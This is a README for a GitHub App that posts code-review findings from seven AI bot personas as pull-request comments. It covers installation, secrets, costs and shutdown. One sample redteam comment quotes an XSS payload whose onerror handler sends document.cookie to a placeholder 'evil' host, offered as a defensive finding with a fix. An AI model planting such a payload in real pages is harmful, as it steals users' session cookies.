# Port Daddy Fleet — GitHub App

Until recently, "what the fleet thinks of your code" lived in a SQLite table on your laptop. Useful, kind of, the way the post-it on the back of your monitor is useful: visible to you, invisible to the rest of the world. The fleet would dutifully read a diff, find a bug, write a note, and that note would sit in `~/.port-daddy/notes.db` forever, like a letter in a drawer.

This GitHub App moves the letters into the mailbox.

When you install **Port Daddy Fleet** on a repo, the seven ships — *reviewer, redteam, qa, test-author, tautology, unspider, documentarian* — start posting their findings as PR comments, review threads, issues, and (occasionally) draft PRs. One App; seven identities. Each comment is prefixed with `**[pd-reviewer]**`, `**[pd-redteam]**`, and so on, so you can tell at a glance which ship is talking and silence the ones you don't want — without uninstalling the App. The fleet stays out of your way until a commit lands, a PR opens, or a check fails; then the relevant ship leaves drydock, does one small specific thing, and ties back up.

It's a small piece of plumbing. The product is the *seven things at once* — review + redteam + QA + test-author + tautology-check + dead-code-hunt + doc-drift-check — done quietly enough that you can ignore the ones you don't care about today and read the ones you do.

---

## Why one App and not seven

I considered shipping seven Apps (one per ship). It would be cuter — `pd-reviewer[bot]`, `pd-redteam[bot]`, each with its own avatar and its own row in your installations page. But seven installations is seven yeses, seven private keys, seven webhook endpoints, and seven things to revoke when you change your mind. Nobody is going to do that.

So: **one App, seven identities.** The differentiation lives in the body of every post — a header line, a unicode mark, a footer — and (eventually) in per-ship avatars rendered server-side. If GitHub ever ships per-message bot identity for Apps, we change the rendering layer and the call sites don't notice. Until then, the `[pd-ship]` prefix is the contract.

---

## Install on your repo

The App isn't registered yet. Once it is, the install flow is:

1. Visit `https://github.com/apps/port-daddy-fleet` *(placeholder — operator updates this after registration)*.
2. Click **Install**, pick the repos you want the fleet to see.
3. GitHub redirects to `https://portdaddy.dev/github/app/installed?installation_id=...` — copy the `installation_id` value from the URL.
4. Stash three secrets in the repo (or wherever your fleet runtime lives — Cloudflare Workers env, `.env.local`, your secret manager of choice):

   ```bash
   GITHUB_APP_ID=...                  # numeric, visible on the App settings page
   GITHUB_APP_PRIVATE_KEY=...         # PEM, raw or base64-encoded
   GITHUB_APP_INSTALLATION_ID=...     # per-repo, from step 3
   ```

5. From your fleet runtime, verify auth with one round-trip:

   ```ts
   import { getOctokitForInstallation } from 'apps/github-app-fleet/lib/auth'
   const oct = await getOctokitForInstallation()
   const me = await oct.apps.getAuthenticated()
   console.log(me.data.slug) // -> port-daddy-fleet
   ```

If that prints the slug, you're in. The next PR opened on the repo will get a comment from whichever ships your fleet config has armed.

> **Note for the operator (you).** You are the App owner. Don't share the private key. Rotate it via the App settings page and re-deploy the env if a runtime ever leaks one. The installation ID is fine to put in plaintext config — it doesn't grant anything by itself.

---

## What you'll see

Each ship has a recognizable shape on the page. Pseudo-screenshots, in order of how often you'll see them:

### `pd-reviewer` (◆) — careful colleague reading your diff

> **[pd-reviewer]** ◆ *reads diffs like a careful colleague*
>
> The new `claimPort` path in `lib/ports.ts` doesn't release the lock on the early-return at line 88. Two callers (`/claim` and `/with-lock`) hit that branch when a port is already claimed by the same identity; in both, the lock taken on line 71 is held until the next claim by that identity (or daemon restart). Small bug, big bill.
>
> *Suggested fix:* hoist the release into a `try/finally`, or invert the branch so the early-return happens before the lock is taken.
>
> <sub>posted by the Port Daddy fleet — `pd-reviewer`</sub>

### `pd-redteam` (▲) — the worst-case reader

> **[pd-redteam]** ▲ *assumes the worst; looks for sharp edges*
>
> The `/sugar/begin` route accepts a `purpose` field as free text and stores it directly in SQLite — fine — but the dashboard renders it via `innerHTML` on the Sugar Context panel. A purpose string of `<img src=x onerror=fetch('//evil/'+document.cookie)>` would run in any session viewing the dashboard. Not exploitable across the network (daemon is loopback-only) but very exploitable across multi-user dev machines.
>
> *Suggested fix:* `textContent`, not `innerHTML`. Or render through a known sanitizer.

### `pd-qa` (●) — the missing-coverage scanner

> **[pd-qa]** ● *runs tests in its head; flags missing coverage*
>
> The new `mergeQueueExecutor` got 412 lines and 0 tests. The closest test file (`tests/unit/merge-queue.test.js`) covers the queue, not the executor. Three branches I can't see being exercised: timeout on a stuck merge, retry on a transient git fetch failure, and the "no orchestrator plugin registered" fallback.
>
> *Suggested fix:* `pd-test-author` can take a swing at this if you want — react with 🚢 and I'll dispatch.

### `pd-test-author` (✚) — writes the missing test, opens a draft PR

> **[pd-test-author]** ✚ *writes the test that was missing*
>
> Picked up the missing executor coverage flagged by `pd-qa`. Drafted three test cases covering the timeout, retry, and unregistered-plugin paths. Each is < 40 lines. Drafted as a PR, not pushed to your branch: you decide.
>
> See the draft PR linked above.

### `pd-tautology` (◇), `pd-unspider` (◐), `pd-documentarian` (✦)

These three are quieter — they post less, and usually as issue comments, not as PR review comments. The shapes are the same: `**[pd-ship]** mark *role*` header, body, signed footer.

A live screenshot gallery lives at `https://portdaddy.dev/docs/fleet/gallery` *(deploys with v3.16; until then, the words above are what you get)*.

---

## Cost expectations

The fleet runs locally by default — Llama 3.1 8B for `reviewer` and `qa`, Qwen for the writing-heavy ships (`test-author`, `documentarian`). Those are free at the marginal-token level.

When you flip a ship to Claude, the model+spend table lives in `docs/fleet/cost-table.md` *(operator: link this once the doc lands)*. Rough numbers from the dogfood week:

| Ship             | Default backend         | Cloud cost / PR (Claude Haiku) |
|------------------|-------------------------|--------------------------------|
| reviewer         | local (llama 8B)        | ~$0.004                        |
| redteam          | local (llama 8B)        | ~$0.006                        |
| qa               | local (llama 8B)        | ~$0.003                        |
| test-author      | local (qwen)            | ~$0.012                        |
| tautology        | local (llama 8B)        | ~$0.001                        |
| unspider         | local (llama 8B)        | ~$0.002                        |
| documentarian    | local (qwen)            | ~$0.008                        |

A noisy PR-heavy week with all seven on Haiku came out to under a dollar across a single repo. Sonnet roughly 10× that; Opus roughly another 5× on top. The operator-side knob is `PD_FLEET_BACKEND` per ship.

---

## Killing the fleet

`pd fleet down` stops the local runners. The App stays installed on the repo — quiet, no posts — until you bring the runners back up. That's the intentional default: uninstalling and reinstalling an App with commit-adjacent permissions is more friction than turning off a daemon, and you should be able to silence the fleet for a week without re-doing the trust dance.

If you want the App actually gone, that's the repo's **Settings → Integrations → GitHub Apps → Configure → Uninstall** flow. Revokes everything.

---

## Files

```
apps/github-app-fleet/
├── manifest.json          # App manifest — paste into the GitHub "create from manifest" flow
├── README.md              # this file
├── CHANGELOG.md
├── lib/
│   ├── auth.ts            # JWT + installation-token mgmt, with caching
│   └── post-as.ts         # postAs(ship, operation) — single entry point
├── icons/                 # three direction concepts × three sizes
│   ├── A-lighthouse/
│   ├── B-anchor/
│   └── C-lantern/
└── scripts/
    └── generate-icons.sh  # nano-banana driver
```

---

## What's still an operator-only call

I held off on these — they're yours:

- The **App slug** (the URL `github.com/apps/<slug>`). I assumed `port-daddy-fleet`; you may want shorter.
- The **webhook URL** in `manifest.json`. Set to a placeholder; you decide which receiver gets the events (Cloudflare Worker, Fly, your laptop via smee, etc).
- The **redirect / setup / callback URLs**. Defaulted to `portdaddy.dev/github/app/*`; if you host the install-experience pages elsewhere, swap them.
- Which **icon direction** to ship. The icons/ folder has three concepts; pick one when you register the App.
- Whether the App is **registered to your personal account** (curiositech-personal) or to a **Curiositech organization**. The latter is probably right for a public App; the former is fine while it's private.
- Actually clicking **Create GitHub App from manifest**. That's a 60-second action that creates the App, but it cannot be reversed by code, so I'm not doing it. See "Time budget" below.

## Time budget

Roughly what you should expect to spend, end-to-end, with this manifest in hand:

| Step                                                                       | Time          |
|----------------------------------------------------------------------------|--------------:|
| Pick an icon direction from `icons/`                                       | 2 min         |
| Decide on the App slug + which account owns it                             | 2 min         |
| Set up a webhook receiver (smee for dev, Worker for prod)                  | 5–15 min      |
| Open `github.com/settings/apps/new?manifest=...` and paste                 | 1 min         |
| Save the generated private key, App ID, and installation ID                | 2 min         |
| Drop the three env vars into your fleet runtime                            | 3 min         |
| First round-trip test (`getOctokitForInstallation` → `apps.getAuthenticated`) | 2 min     |
| **Total (no surprises)**                                                   | **~20–30 min** |

If you've never set up an App before, double that. If you have, this is a coffee.
